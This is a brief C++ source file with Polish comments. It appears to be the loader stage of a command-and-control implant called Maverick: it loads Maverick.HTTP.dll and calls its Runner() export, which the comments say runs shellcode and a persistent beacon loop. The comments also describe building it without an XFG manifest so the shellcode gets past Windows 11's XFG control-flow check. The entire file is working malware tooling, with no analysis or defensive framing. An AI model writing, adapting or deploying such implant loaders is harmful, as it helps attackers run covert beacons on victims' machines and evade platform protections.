/*
 * Maverick - Minimal DLL Loader
 *
 * Laduje Maverick.HTTP.dll i wywoluje eksport Runner().
 * Skompilowany mingw bez XFG manifestu -> shellcode dziala bez XFG check.
 * Sluzy do testu DLL w srodowisku bez XFG (obejscie problemu rundll32 na Win11 24H2).
 */
#include <windows.h>

#define DLL_NAME L"Maverick.HTTP.dll"

static HMODULE g_dll = NULL;

auto WINAPI WinMain(
    _In_ HINSTANCE Instance,
    _In_ HINSTANCE PrevInstance,
    _In_ LPSTR     CommandLine,
    _In_ INT32     ShowCmd
) -> INT32 {
    /* 1. Zaladuj DLL */
    g_dll = LoadLibraryW(DLL_NAME);
    if (g_dll == NULL) {
        return 1;
    }

    /* 2. Znajdz eksport Runner */
    typedef void (*RunnerFn)(void);
    RunnerFn runner = (RunnerFn)GetProcAddress(g_dll, "Runner");
    if (runner == NULL) {
        FreeLibrary(g_dll);
        return 2;
    }

    /* 3. Wywolaj shellcode (beacon bedzie dzialal w tym procesie) */
    runner();

    /* Runner() nie wraca - beacon siedzi w petli while(!exit_flag) */
    FreeLibrary(g_dll);
    return 0;
}
